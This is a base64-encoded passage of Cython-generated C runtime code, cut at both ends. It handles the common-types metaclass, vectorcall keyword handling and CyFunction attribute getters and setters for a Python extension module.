QgKmt3ZHMpIHtcbiAgICBQeUVycl9TZXRTdHJpbmcoUHlFeGNfVHlwZUVycm9yLCAiQ2Fubm90IGluc3RhbnRpYXRlIEN5dGhvbiBpbnRlcm5hbCB0eXBlcyIpO1xuICAgIHJldHVybiBOVUxMO1xufVxuc3RhdGljIGludCBfX3B5eF9Db21tb25UeXBlc01ldGFjbGFzc19zZXRhdHRyKENZVEhPTl9VTlVTRUQgUHlPYmplY3QgKnNlbGYsIENZVEhPTl9VTlVTRUQgUHlPYmplY3QgKmF0dHIsIENZVEhPTl9VTlVTRUQgUHlPYmplY3QgKnZhbHVlKSB7XG4gICAgUHlFcnJfU2V0U3RyaW5nKFB5RXhjX1R5cGVFcnJvciwgIkN5dGhvbiBpbnRlcm5hbCB0eXBlcyBhcmUgaW1tdXRhYmxlIik7XG4gICAgcmV0dXJuIC0xO1xufVxuI2VuZGlmXG5zdGF0aWMgUHlHZXRTZXREZWYgX19weXhfQ29tbW9uVHlwZXNNZXRhY2xhc3NfZ2V0c2V0W10gPSB7XG4gICAgeyJfX21vZHVsZV9fIiwgX19weXhfQ29tbW9uVHlwZXNNZXRhY2xhc3NfZ2V0X21vZHVsZSwgTlVMTCwgTlVMTCwgTlVMTH0sXG4gICAgezAsIDAsIDAsIDAsIDB9XG59O1xuc3RhdGljIFB5VHlwZV9TbG90IF9fcHl4X0NvbW1vblR5cGVzTWV0YWNsYXNzX3Nsb3RzW10gPSB7XG4gICAge1B5X3RwX2dldHNldCwgKHZvaWQgKilfX3B5eF9Db21tb25UeXBlc01ldGFjbGFzc19nZXRzZXR9LFxuICAgICNpZiBfX1BZWF9MSU1JVEVEX1ZFUlNJT05fSEVYIDwgMHgwMzBBMDAwMFxuICAgIHtQeV90cF9jYWxsLCAodm9pZCopX19weXhfQ29tbW9uVHlwZXNNZXRhY2xhc3NfY2FsbH0sXG4gICAge1B5X3RwX25ldywgKHZvaWQqKV9fcHl4X0NvbW1vblR5cGVzTWV0YWNsYXNzX2NhbGx9LFxuICAgIHtQeV90cF9zZXRhdHRybywgKHZvaWQqKV9fcHl4X0NvbW1vblR5cGVzTWV0YWNsYXNzX3NldGF0dHJ9LFxuICAgICNlbmRpZlxuICAgIHswLCAwfVxufTtcbnN0YXRpYyBQeVR5cGVfU3BlYyBfX3B5eF9Db21tb25UeXBlc01ldGFjbGFzc19zcGVjID0ge1xuICAgIF9fUFlYX1RZUEVfTU9EVUxFX1BSRUZJWCAiX2NvbW1vbl90eXBlc19tZXRhdHlwZSIsXG4gICAgMCxcbiAgICAwLFxuICAgIFB5X1RQRkxBR1NfSU1NVVRBQkxFVFlQRSB8XG4gICAgUHlfVFBGTEFHU19ESVNBTExPV19JTlNUQU5USUFUSU9OIHxcbiAgICBQeV9UUEZMQUdTX0RFRkFVTFQsXG4gICAgX19weXhfQ29tbW9uVHlwZXNNZXRhY2xhc3Nfc2xvdHNcbn07XG5zdGF0aWMgaW50IF9fcHl4X0NvbW1vblR5cGVzTWV0YWNsYXNzX2luaXQoUHlPYmplY3QgKm1vZHVsZSkge1xuICAgIF9fcHl4X21zdGF0ZXR5cGUgKm1zdGF0ZSA9IF9fUHl4X1B5TW9kdWxlX0dldFN0YXRlKG1vZHVsZSk7XG4gICAgUHlPYmplY3QgKmJhc2VzID0gUHlUdXBsZV9QYWNrKDEsICZQeVR5cGVfVHlwZSk7XG4gICAgaWYgKHVubGlrZWx5KCFiYXNlcykpIHtcbiAgICAgICAgcmV0dXJuIC0xO1xuICAgIH1cbiAgICBtc3RhdGUtPl9fcHl4X0NvbW1vblR5cGVzTWV0YWNsYXNzVHlwZSA9IF9fUHl4X0ZldGNoQ29tbW9uVHlwZUZyb21TcGVjKE5VTEwsIG1vZHVsZSwgJl9fcHl4X0NvbW1vblR5cGVzTWV0YWNsYXNzX3NwZWMsIGJhc2VzKTtcbiAgICBQeV9ERUNSRUYoYmFzZXMpO1xuICAgIGlmICh1bmxpa2VseShtc3RhdGUtPl9fcHl4X0NvbW1vblR5cGVzTWV0YWNsYXNzVHlwZSA9PSBOVUxMKSkge1xuICAgICAgICByZXR1cm4gLTE7XG4gICAgfVxuICAgIHJldHVybiAwO1xufVxuXG5cbiNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJXG5zdGF0aWMgUHlPYmplY3QgKl9fUHl4X1B5TWV0aG9kX05ldyhQeU9iamVjdCAqZnVuYywgUHlPYmplY3QgKnNlbGYsIFB5T2JqZWN0ICp0eXApIHtcbiAgICBQeU9iamVjdCAqcmVzdWx0O1xuICAgIENZVEhPTl9VTlVTRURfVkFSKHR5cCk7XG4gICAgaWYgKCFzZWxmKVxuICAgICAgICByZXR1cm4gX19QeXhfTmV3UmVmKGZ1bmMpO1xuICAgICNpZiBfX1BZWF9MSU1JVEVEX1ZFUlNJT05fSEVYID49IDB4MDMwQzAwMDBcbiAgICB7XG4gICAgICAgIFB5T2JqZWN0ICphcmdzW10gPSB7ZnVuYywgc2VsZn07XG4gICAgICAgIHJlc3VsdCA9IFB5T2JqZWN0X1ZlY3RvcmNhbGwoX19weXhfbXN0YXRlX2dsb2JhbC0+X19QeXhfQ2FjaGVkTWV0aG9kVHlwZSwgYXJncywgMiwgTlVMTCk7XG4gICAgfVxuICAgICNlbHNlXG4gICAgcmVzdWx0ID0gUHlPYmplY3RfQ2FsbEZ1bmN0aW9uT2JqQXJncyhfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX1B5eF9DYWNoZWRNZXRob2RUeXBlLCBmdW5jLCBzZWxmLCBOVUxMKTtcbiAgICAjZW5kaWZcbiAgICByZXR1cm4gcmVzdWx0O1xufVxuI2Vsc2VcbnN0YXRpYyBQeU9iamVjdCAqX19QeXhfUHlNZXRob2RfTmV3KFB5T2JqZWN0ICpmdW5jLCBQeU9iamVjdCAqc2VsZiwgUHlPYmplY3QgKnR5cCkge1xuICAgIENZVEhPTl9VTlVTRURfVkFSKHR5cCk7XG4gICAgaWYgKCFzZWxmKVxuICAgICAgICByZXR1cm4gX19QeXhfTmV3UmVmKGZ1bmMpO1xuICAgIHJldHVybiBQeU1ldGhvZF9OZXcoZnVuYywgc2VsZik7XG59XG4jZW5kaWZcblxuXG4jaWYgQ1lUSE9OX01FVEhfRkFTVENBTEwgJiYgQ1lUSE9OX1ZFQ1RPUkNBTExcbnN0YXRpYyBQeU9iamVjdCAqX19QeXhfUHlWZWN0b3JjYWxsX0Zhc3RDYWxsRGljdF9rdyhQeU9iamVjdCAqZnVuYywgX19weXhfdmVjdG9yY2FsbGZ1bmMgdmMsIFB5T2JqZWN0ICpjb25zdCAqYXJncywgc2l6ZV90IG5hcmdzLCBQeU9iamVjdCAqa3cpXG57XG4gICAgUHlPYmplY3QgKnJlcyA9IE5VTEw7XG4gICAgUHlPYmplY3QgKmt3bmFtZXM7XG4gICAgUHlPYmplY3QgKipuZXdhcmdzO1xuICAgIFB5T2JqZWN0ICoqa3d2YWx1ZXM7XG4gICAgUHlfc3NpemVfdCBpO1xuICAgICNpZiBDWVRIT05fQVZPSURfQk9SUk9XRURfUkVGU1xuICAgIFB5T2JqZWN0ICpwb3M7XG4gICAgI2Vsc2VcbiAgICBQeV9zc2l6ZV90IHBvcztcbiAgICAjZW5kaWZcbiAgICBzaXplX3QgajtcbiAgICBQeU9iamVjdCAqa2V5LCAqdmFsdWU7XG4gICAgdW5zaWduZWQgbG9uZyBrZXlzX2FyZV9zdHJpbmdzO1xuICAgICNpZiAhQ1lUSE9OX0FTU1VNRV9TQUZFX1NJWkVcbiAgICBQeV9zc2l6ZV90IG5rdyA9IFB5RGljdF9TaXplKGt3KTtcbiAgICBpZiAodW5saWtlbHkobmt3ID09IC0xKSkgcmV0dXJuIE5VTEw7XG4gICAgI2Vsc2VcbiAgICBQeV9zc2l6ZV90IG5rdyA9IFB5RGljdF9HRVRfU0laRShrdyk7XG4gICAgI2VuZGlmXG4gICAgbmV3YXJncyA9IChQeU9iamVjdCAqKilQeU1lbV9NYWxsb2MoKG5hcmdzICsgKHNpemVfdClua3cpICogc2l6ZW9mKGFyZ3NbMF0pKTtcbiAgICBpZiAodW5saWtlbHkobmV3YXJncyA9PSBOVUxMKSkge1xuICAgICAgICBQeUVycl9Ob01lbW9yeSgpO1xuICAgICAgICByZXR1cm4gTlVMTDtcbiAgICB9XG4gICAgZm9yIChqID0gMDsgaiA8IG5hcmdzOyBqKyspIG5ld2FyZ3Nbal0gPSBhcmdzW2pdO1xuICAgIGt3bmFtZXMgPSBQeVR1cGxlX05ldyhua3cpO1xuICAgIGlmICh1bmxpa2VseShrd25hbWVzID09IE5VTEwpKSB7XG4gICAgICAgIFB5TWVtX0ZyZWUobmV3YXJncyk7XG4gICAgICAgIHJldHVybiBOVUxMO1xuICAgIH1cbiAgICBrd3ZhbHVlcyA9IG5ld2FyZ3MgKyBuYXJncztcbiAgICBwb3MgPSAwO1xuICAgIGkgPSAwO1xuICAgIGtleXNfYXJlX3N0cmluZ3MgPSBQeV9UUEZMQUdTX1VOSUNPREVfU1VCQ0xBU1M7XG4gICAgd2hpbGUgKF9fUHl4X1B5RGljdF9OZXh0UmVmKGt3LCAmcG9zLCAma2V5LCAmdmFsdWUpKSB7XG4gICAgICAgIGtleXNfYXJlX3N0cmluZ3MgJj1cbiAgICAgICAgI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUElcbiAgICAgICAgICAgIFB5VHlwZV9HZXRGbGFncyhQeV9UWVBFKGtleSkpO1xuICAgICAgICAjZWxzZVxuICAgICAgICAgICAgUHlfVFlQRShrZXkpLT50cF9mbGFncztcbiAgICAgICAgI2VuZGlmXG4gICAgICAgICNpZiAhQ1lUSE9OX0FTU1VNRV9TQUZFX01BQ1JPU1xuICAgICAgICBpZiAodW5saWtlbHkoUHlUdXBsZV9TZXRJdGVtKGt3bmFtZXMsIGksIGtleSkgPCAwKSkgZ290byBjbGVhbnVwO1xuICAgICAgICAjZWxzZVxuICAgICAgICBQeVR1cGxlX1NFVF9JVEVNKGt3bmFtZXMsIGksIGtleSk7XG4gICAgICAgICNlbmRpZlxuICAgICAgICBrd3ZhbHVlc1tpXSA9IHZhbHVlO1xuICAgICAgICBpKys7XG4gICAgfVxuICAgIGlmICh1bmxpa2VseSgha2V5c19hcmVfc3RyaW5ncykpIHtcbiAgICAgICAgUHlFcnJfU2V0U3RyaW5nKFB5RXhjX1R5cGVFcnJvciwgImtleXdvcmRzIG11c3QgYmUgc3RyaW5ncyIpO1xuICAgICAgICBnb3RvIGNsZWFudXA7XG4gICAgfVxuICAgIHJlcyA9IHZjKGZ1bmMsIG5ld2FyZ3MsIG5hcmdzLCBrd25hbWVzKTtcbmNsZWFudXA6XG4gICAgI2lmIENZVEhPTl9BVk9JRF9CT1JST1dFRF9SRUZTXG4gICAgUHlfREVDUkVGKHBvcyk7XG4gICAgI2VuZGlmXG4gICAgUHlfREVDUkVGKGt3bmFtZXMpO1xuICAgIGZvciAoaSA9IDA7IGkgPCBua3c7IGkrKylcbiAgICAgICAgUHlfREVDUkVGKGt3dmFsdWVzW2ldKTtcbiAgICBQeU1lbV9GcmVlKG5ld2FyZ3MpO1xuICAgIHJldHVybiByZXM7XG59XG5zdGF0aWMgQ1lUSE9OX0lOTElORSBQeU9iamVjdCAqX19QeXhfUHlWZWN0b3JjYWxsX0Zhc3RDYWxsRGljdChQeU9iamVjdCAqZnVuYywgX19weXhfdmVjdG9yY2FsbGZ1bmMgdmMsIFB5T2JqZWN0ICpjb25zdCAqYXJncywgc2l6ZV90IG5hcmdzLCBQeU9iamVjdCAqa3cpXG57XG4gICAgUHlfc3NpemVfdCBrd19zaXplID1cbiAgICAgICAgbGlrZWx5KGt3ID09IE5VTEwpID9cbiAgICAgICAgMCA6XG4jaWYgIUNZVEhPTl9BU1NVTUVfU0FGRV9TSVpFXG4gICAgICAgIFB5RGljdF9TaXplKGt3KTtcbiNlbHNlXG4gICAgICAgIFB5RGljdF9HRVRfU0laRShrdyk7XG4jZW5kaWZcbiAgICBpZiAoa3dfc2l6ZSA9PSAwKSB7XG4gICAgICAgIHJldHVybiB2YyhmdW5jLCBhcmdzLCBuYXJncywgTlVMTCk7XG4gICAgfVxuI2lmICFDWVRIT05fQVNTVU1FX1NBRkVfU0laRVxuICAgIGVsc2UgaWYgKHVubGlrZWx5KGt3X3NpemUgPT0gLTEpKSB7XG4gICAgICAgIHJldHVybiBOVUxMO1xuICAgIH1cbiNlbmRpZlxuICAgIHJldHVybiBfX1B5eF9QeVZlY3RvcmNhbGxfRmFzdENhbGxEaWN0X2t3KGZ1bmMsIHZjLCBhcmdzLCBuYXJncywga3cpO1xufVxuI2VuZGlmXG5cblxuI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUElcbnN0YXRpYyBDWVRIT05fSU5MSU5FIGludCBfX1B5eF9fSXNTYW1lQ3lPckNGdW5jdGlvbk5vTWV0aG9kKFB5T2JqZWN0ICpmdW5jLCB2b2lkICgqY2Z1bmMpKHZvaWQpKSB7XG4gICAgaWYgKF9fUHl4X0N5RnVuY3Rpb25fQ2hlY2soZnVuYykpIHtcbiAgICAgICAgcmV0dXJuIFB5Q0Z1bmN0aW9uX0dldEZ1bmN0aW9uKCgoX19weXhfQ3lGdW5jdGlvbk9iamVjdCopZnVuYyktPmZ1bmMpID09IChQeUNGdW5jdGlvbikgY2Z1bmM7XG4gICAgfSBlbHNlIGlmIChQeUNGdW5jdGlvbl9DaGVjayhmdW5jKSkge1xuICAgICAgICByZXR1cm4gUHlDRnVuY3Rpb25fR2V0RnVuY3Rpb24oZnVuYykgPT0gKFB5Q0Z1bmN0aW9uKSBjZnVuYztcbiAgICB9XG4gICAgcmV0dXJuIDA7XG59XG5zdGF0aWMgQ1lUSE9OX0lOTElORSBpbnQgX19QeXhfX0lzU2FtZUN5T3JDRnVuY3Rpb24oUHlPYmplY3QgKmZ1bmMsIHZvaWQgKCpjZnVuYykodm9pZCkpIHtcbiAgICBpZiAoKFB5T2JqZWN0KilQeV9UWVBFKGZ1bmMpID09IF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fUHl4X0NhY2hlZE1ldGhvZFR5cGUpIHtcbiAgICAgICAgaW50IHJlc3VsdDtcbiAgICAgICAgUHlPYmplY3QgKm5ld0Z1bmMgPSBQeU9iamVjdF9HZXRBdHRyKGZ1bmMsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9mdW5jKTtcbiAgICAgICAgaWYgKHVubGlrZWx5KCFuZXdGdW5jKSkge1xuICAgICAgICAgICAgUHlFcnJfQ2xlYXIoKTsgLy8gSXRcJ3Mgb25seSBhbiBvcHRpbWl6YXRpb24sIHNvIGRvblwndCB0aHJvdyBhbiBlcnJvclxuICAgICAgICAgICAgcmV0dXJuIDA7XG4gICAgICAgIH1cbiAgICAgICAgcmVzdWx0ID0gX19QeXhfX0lzU2FtZUN5T3JDRnVuY3Rpb25Ob01ldGhvZChuZXdGdW5jLCBjZnVuYyk7XG4gICAgICAgIFB5X0RFQ1JFRihuZXdGdW5jKTtcbiAgICAgICAgcmV0dXJuIHJlc3VsdDtcbiAgICB9XG4gICAgcmV0dXJuIF9fUHl4X19Jc1NhbWVDeU9yQ0Z1bmN0aW9uTm9NZXRob2QoZnVuYywgY2Z1bmMpO1xufVxuI2Vsc2VcbnN0YXRpYyBDWVRIT05fSU5MSU5FIGludCBfX1B5eF9fSXNTYW1lQ3lPckNGdW5jdGlvbihQeU9iamVjdCAqZnVuYywgdm9pZCAoKmNmdW5jKSh2b2lkKSkge1xuICAgIGlmIChQeU1ldGhvZF9DaGVjayhmdW5jKSkge1xuICAgICAgICBmdW5jID0gUHlNZXRob2RfR0VUX0ZVTkNUSU9OKGZ1bmMpO1xuICAgIH1cbiAgICByZXR1cm4gX19QeXhfQ3lPclB5Q0Z1bmN0aW9uX0NoZWNrKGZ1bmMpICYmIF9fUHl4X0N5T3JQeUNGdW5jdGlvbl9HRVRfRlVOQ1RJT04oZnVuYykgPT0gKFB5Q0Z1bmN0aW9uKSBjZnVuYztcbn1cbiNlbmRpZlxuc3RhdGljIENZVEhPTl9JTkxJTkUgdm9pZCBfX1B5eF9fQ3lGdW5jdGlvbl9TZXRDbGFzc09iaihfX3B5eF9DeUZ1bmN0aW9uT2JqZWN0KiBmLCBQeU9iamVjdCogY2xhc3NvYmopIHtcbiNpZiBQWV9WRVJTSU9OX0hFWCA8IDB4MDMwOTAwQjEgfHwgQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSVxuICAgIF9fUHl4X1B5X1hERUNSRUZfU0VUKFxuICAgICAgICBfX1B5eF9DeUZ1bmN0aW9uX0dldENsYXNzT2JqKGYpLFxuICAgICAgICAgICAgKChjbGFzc29iaikgPyBfX1B5eF9OZXdSZWYoY2xhc3NvYmopIDogTlVMTCkpO1xuI2Vsc2VcbiAgICBfX1B5eF9QeV9YREVDUkVGX1NFVChcbiAgICAgICAgKChQeUNNZXRob2RPYmplY3QgKikgKGYpKS0+bW1fY2xhc3MsXG4gICAgICAgIChQeVR5cGVPYmplY3QqKSgoY2xhc3NvYmopID8gX19QeXhfTmV3UmVmKGNsYXNzb2JqKSA6IE5VTEwpKTtcbiNlbmRpZlxufVxuc3RhdGljIFB5T2JqZWN0ICpcbl9fUHl4X0N5RnVuY3Rpb25fZ2V0X2RvY19sb2NrZWQoX19weXhfQ3lGdW5jdGlvbk9iamVjdCAqb3ApXG57XG4gICAgaWYgKHVubGlrZWx5KG9wLT5mdW5jX2RvYyA9PSBOVUxMKSkge1xuI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUElcbiAgICAgICAgb3AtPmZ1bmNfZG9jID0gUHlPYmplY3RfR2V0QXR0clN0cmluZyhvcC0+ZnVuYywgIl9fZG9jX18iKTtcbiAgICAgICAgaWYgKHVubGlrZWx5KCFvcC0+ZnVuY19kb2MpKSByZXR1cm4gTlVMTDtcbiNlbHNlXG4gICAgICAgIGlmICgoKFB5Q0Z1bmN0aW9uT2JqZWN0KilvcCktPm1fbWwtPm1sX2RvYykge1xuICAgICAgICAgICAgb3AtPmZ1bmNfZG9jID0gUHlVbmljb2RlX0Zyb21TdHJpbmcoKChQeUNGdW5jdGlvbk9iamVjdCopb3ApLT5tX21sLT5tbF9kb2MpO1xuICAgICAgICAgICAgaWYgKHVubGlrZWx5KG9wLT5mdW5jX2RvYyA9PSBOVUxMKSlcbiAgICAgICAgICAgICAgICByZXR1cm4gTlVMTDtcbiAgICAgICAgfSBlbHNlIHtcbiAgICAgICAgICAgIFB5X0lOQ1JFRihQeV9Ob25lKTtcbiAgICAgICAgICAgIHJldHVybiBQeV9Ob25lO1xuICAgICAgICB9XG4jZW5kaWZcbiAgICB9XG4gICAgUHlfSU5DUkVGKG9wLT5mdW5jX2RvYyk7XG4gICAgcmV0dXJuIG9wLT5mdW5jX2RvYztcbn1cbnN0YXRpYyBQeU9iamVjdCAqXG5fX1B5eF9DeUZ1bmN0aW9uX2dldF9kb2MoX19weXhfQ3lGdW5jdGlvbk9iamVjdCAqb3AsIHZvaWQgKmNsb3N1cmUpIHtcbiAgICBQeU9iamVjdCAqcmVzdWx0O1xuICAgIENZVEhPTl9VTlVTRURfVkFSKGNsb3N1cmUpO1xuICAgIF9fUHl4X0JFR0lOX0NSSVRJQ0FMX1NFQ1RJT04ob3ApO1xuICAgIHJlc3VsdCA9IF9fUHl4X0N5RnVuY3Rpb25fZ2V0X2RvY19sb2NrZWQob3ApO1xuICAgIF9fUHl4X0VORF9DUklUSUNBTF9TRUNUSU9OKCk7XG4gICAgcmV0dXJuIHJlc3VsdDtcbn1cbnN0YXRpYyBpbnRcbl9fUHl4X0N5RnVuY3Rpb25fc2V0X2RvYyhfX3B5eF9DeUZ1bmN0aW9uT2JqZWN0ICpvcCwgUHlPYmplY3QgKnZhbHVlLCB2b2lkICpjb250ZXh0KVxue1xuICAgIENZVEhPTl9VTlVTRURfVkFSKGNvbnRleHQpO1xuICAgIGlmICh2YWx1ZSA9PSBOVUxMKSB7XG4gICAgICAgIHZhbHVlID0gUHlfTm9uZTtcbiAgICB9XG4gICAgUHlfSU5DUkVGKHZhbHVlKTtcbiAgICBfX1B5eF9CRUdJTl9DUklUSUNBTF9TRUNUSU9OKG9wKTtcbiAgICBfX1B5eF9QeV9YREVDUkVGX1NFVChvcC0+ZnVuY19kb2MsIHZhbHVlKTtcbiAgICBfX1B5eF9FTkRfQ1JJVElDQUxfU0VDVElPTigpO1xuICAgIHJldHVybiAwO1xufVxuc3RhdGljIFB5T2JqZWN0ICpcbl9fUHl4X0N5RnVuY3Rpb25fZ2V0X25hbWVfbG9ja2VkKF9fcHl4X0N5RnVuY3Rpb25PYmplY3QgKm9wKVxue1xuICAgIGlmICh1bmxpa2VseShvcC0+ZnVuY19uYW1lID09IE5VTEwpKSB7XG4jaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSVxuICAgICAgICBvcC0+ZnVuY19uYW1lID0gUHlPYmplY3RfR2V0QXR0clN0cmluZyhvcC0+ZnVuYywgIl9fbmFtZV9fIik7XG4jZWxzZVxuICAgICAgICBvcC0+ZnVuY19uYW1lID0gUHlVbmljb2RlX0ludGVybkZyb21TdHJpbmcoKChQeUNGdW5jdGlvbk9iamVjdCopb3ApLT5tX21sLT5tbF9uYW1lKTtcbiNlbmRpZlxuICAgICAgICBpZiAodW5saWtlbHkob3AtPmZ1bmNfbmFtZSA9PSBOVUxMKSlcbiAgICAgICAgICAgIHJldHVybiBOVUxMO1xuICAgIH1cbiAgICBQeV9JTkNSRUYob3AtPmZ1bmNfbmFtZSk7XG4gICAgcmV0dXJuIG9wLT5mdW5jX25hbWU7XG59XG5zdGF0aWMgUHlPYmplY3QgKlxuX19QeXhfQ3lGdW5jdGlvbl9nZXRfbmFtZShfX3B5eF9DeUZ1bmN0aW9uT2JqZWN0ICpvcCwgdm9pZCAqY29udGV4dClcbntcbiAgICBQeU9iamVjdCAqcmVzdWx0ID0gTlVMTDtcbiAgICBDWVRIT05fVU5VU0VEX1ZBUihjb250ZXh0KTtcbiAgICBfX1B5eF9CRUdJTl9DUklUSUNBTF9TRUNUSU9OKG9wKTtcbiAgICByZXN1bHQgPSBfX1B5eF9DeUZ1bmN0aW9uX2dldF9uYW1lX2xvY2tlZChvcCk7XG4gICAgX19QeXhfRU5EX0NSSVRJQ0FMX1NFQ1RJT04oKTtcbiAgICByZXR1cm4gcmVzdWx0O1xufVxuc3RhdGljIGludFxuX19QeXhfQ3lGdW5jdGlvbl9zZXRfbmFtZShfX3B5eF9DeUZ1bmN0aW9uT2JqZWN0ICpvcCwgUHlPYmplY3QgKnZhbHVlLCB2b2lkICpjb250ZXh0KVxue1xuICAgIENZVEhPTl9VTlVTRURfVkFSKGNvbnRleHQpO1xuICAgIGlmICh1bmxpa2VseSh2YWx1ZSA9PSBOVUxMIHx8ICFQeVVuaWNvZGVfQ2hlY2sodmFsdWUpKSkge1xuICAgICAgICBQeUVycl9TZXRTdHJpbmcoUHlFeGNfVHlwZUVycm9yLFxuICAgICAgICAgICAgICAgICAgICAgICAgIl9fbmFtZV9fIG11c3QgYmUgc2V0IHRvIGEgc3RyaW5nIG9iamVjdCIpO1xuICAgICAgICByZXR1cm4gLTE7XG4gICAgfVxuICAgIFB5X0lOQ1JFRih2YWx1ZSk7XG4gICAgX19QeXhfQkVHSU5fQ1JJVElDQUxfU0VDVElPTihvcCk7XG4gICAgX19QeXhfUHlfWERFQ1JFRl9TRVQob3AtPmZ1bmNfbmFtZSwgdmFsdWUpO1xuICAgIF9fUHl4X0VORF9DUklUSUNBTF9TRUNUSU9OKCk7XG4gICAgcmV0dXJuIDA7XG59XG5zdGF0aWMgUHlPYmplY3QgKlxuX19QeXhfQ3lGdW5jdGlvbl9nZXRfcXVhbG5hbWUoX19weXhfQ3lGdW5jdGlvbk9iamVjdCAqb3AsIHZvaWQgKmNvbnRleHQpXG57XG4gICAgQ1lUSE9OX1VOVVNFRF9WQVIoY29udGV4dCk7XG4gICAgUHlPYmplY3QgKnJlc3VsdDtcbiAgICBfX1B5eF9CRUdJTl9DUklUSUNBTF9TRUNUSU9OKG9wKTtcbiAgICBQeV9JTkNSRUYob3AtPmZ1bmNfcXVhbG5hbWUpO1xuICAgIHJlc3VsdCA9IG9wLT5mdW5jX3F1YWxuYW1lO1xuICAgIF9fUHl4X0VORF9DUklUSUNBTF9TRUNUSU9OKCk7XG4gICAgcmV0dXJuIHJlc3VsdDtcbn1cbnN0YXRpYyBpbnRcbl9fUHl4X0N5RnVuY3Rpb25fc2V0X3F1YWxuYW1lKF9fcHl4X0N5RnVuY3Rpb25PYmplY3QgKm9wLCBQeU9iamVjdCAqdmFsdWUsIHZvaWQgKmNvbnRleHQpXG57XG4gICAgQ1lUSE9OX1VOVVNFRF9WQVIoY29udGV4dCk7XG4gICAgaWYgKHVubGlrZWx5KHZhbHVlID09IE5VTEwgfHwgIVB5VW5pY29kZV9DaGVjayh2YWx1ZSkpKSB7XG4gICAgICAgIFB5RXJyX1NldFN0cmluZyhQeUV4Y19UeXBlRXJyb3IsXG4gICAgICAgICAgICAgICAgICAgICAgICAiX19xdWFsbmFtZV9fIG11c3QgYmUgc2V0IHRvIGEgc3RyaW5nIG9iamVjdCIpO1xuICAgICAgICByZXR1cm4gLTE7XG4gICAgfVxuICAgIFB5X0lOQ1JFRih2YWx1ZSk7XG4gICAgX19QeXhfQkVHSU5fQ1JJVElDQUxfU0VDVElPTihvcCk7XG4gICAgX19QeXhfUHlfWERFQ1JFRl9TRVQob3AtPmZ1bmNfcXVhbG5hbWUsIHZhbHVlKTtcbiAgICBfX1B5eF9FTkRfQ1JJVElDQUxfU0VDVElPTigpO1xuICAgIHJldHVybiAwO1xufVxuI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUEkgJiYgX19QWVhfTElNSVRFRF9WRVJTSU9OX0hFWCA8IDB4MDMwQTAwMDBcbnN0YXRpYyBQeU9iamVjdCAqXG5fX1B5eF9DeUZ1bmN0aW9uX2dldF9kaWN0KF9fcHl4X0N5RnVuY3Rpb25PYmplY3QgKm9wLCB2b2lkICpjb250ZXh0KVxue1xuICAgIENZVEhPTl9VTlVTRURfVkFSKGNvbnRleHQpO1xuICAgIGlmICh1bmxpa2VseShvcC0+ZnVuY19kaWN0ID09IE5VTEwpKSB7XG4gICAgICAgIG9wLT5mdW5jX2RpY3QgPSBQeURpY3RfTmV3KCk7XG4gICAgICAgIGlmICh1bmxpa2VseShvcC0+ZnVuY19kaWN0ID09IE5VTEwpKVxuICAgICAgICAgICAgcmV0dXJuIE5VTEw7XG4gICAgfVxuICAgIFB5X0lOQ1JFRihvcC0+ZnVuY19kaWN0KTtcbiAgICByZXR1cm4gb3AtPmZ1bmNfZGljdDtcbn1cbiNlbmRpZlxuc3RhdGljIFB5T2JqZWN0ICpcbl9fUHl4X0N5RnVuY3Rpb25fZ2V0X2dsb2JhbHMoX19weXhfQ3lGdW5jdGlvbk9iamVjdCAqb3AsIHZvaWQgKmNvbnRleHQpXG57XG4gICAgQ1lUSE9OX1VOVVNFRF9WQVIoY29udGV4dCk7XG4gICAgUHlfSU5DUkVGKG9wLT5mdW5jX2dsb2JhbHMpO1xuICAgIHJldHVybiBvcC0+ZnVuY19nbG9iYWxzO1xufVxuc3RhdGljIFB5T2JqZWN0ICpcbl9fUHl4X0N5RnVuY3Rpb25fZ2V0X2Nsb3N1cmUoX19weXhfQ3lGdW5jdGlvbk9iamVjdCAqb3AsIHZvaWQgKmNvbnRleHQpXG57XG4gICAgQ1lUSE9OX1VOVVNFRF9WQVIob3ApO1xuICAgIENZVEhPTl9VTlVTRURfVkFSKGNvbnRleHQpO1xuICAgIFB5X0lOQ1JFRihQeV9Ob25lKTtcbiAgICByZXR1cm4gUHlfTm9uZTtcbn1cbnN0YXRpYyBQeU9iamVjdCAqXG5fX1B5eF9DeUZ1bmN0aW9uX2dldF9jb2RlKF9fcHl4X0N5RnVuY3Rpb25PYmplY3QgKm9wLCB2b2lkICpjb250ZXh0KVxue1xuICAgIFB5T2JqZWN0KiByZXN1bHQgPSAob3AtPmZ1bmNfY29kZSkgPyBvcC0+ZnVuY19jb2RlIDogUHlfTm9uZTtcbiAgICBDWVRIT05fVU5VU0VEX1ZBUihjb250ZXh0KTtcbiAgICBQeV9JTkNSRUYocmVzdWx0KTtcbiAgICByZXR1cm4gcmVzdWx0O1xufVxuc3RhdGljIGludFxuX19QeXhfQ3lGdW5jdGlvbl9pbml0X2RlZmF1bHRzKF9fcHl4X0N5RnVuY3Rpb25PYmplY3QgKm9wKSB7XG4gICAgaW50IHJlc3VsdCA9IDA7XG4gICAgUHlPYmplY3QgKnJlcyA9IG9wLT5kZWZhdWx0c19nZXR0ZXIoKFB5T2JqZWN0ICopIG9wKTtcbiAgICBpZiAodW5saWtlbHkoIXJlcykpXG4gICAgICAgIHJldHVybiAtMTtcbiAgICAjaWYgQ1lUSE9OX0FTU1VNRV9TQUZFX01BQ1JPUyAmJiAhQ1lUSE9OX0FWT0lEX0JPUlJPV0VEX1JFRlNcbiAgICBvcC0+ZGVmYXVsdHNfdHVwbGUgPSBQeVR1cGxlX0dFVF9JVEVNKHJlcywgMCk7XG4gICAgUHlfSU5DUkVGKG9wLT5kZWZhdWx0c190dXBsZSk7XG4gICAgb3AtPmRlZmF1bHRzX2t3ZGljdCA9IFB5VHVwbGVfR0VUX0lURU0ocmVzLCAxKTtcbiAgICBQeV9JTkNSRUYob3AtPmRlZmF1bHRzX2t3ZGljdCk7XG4gICAgI2Vsc2VcbiAgICBvcC0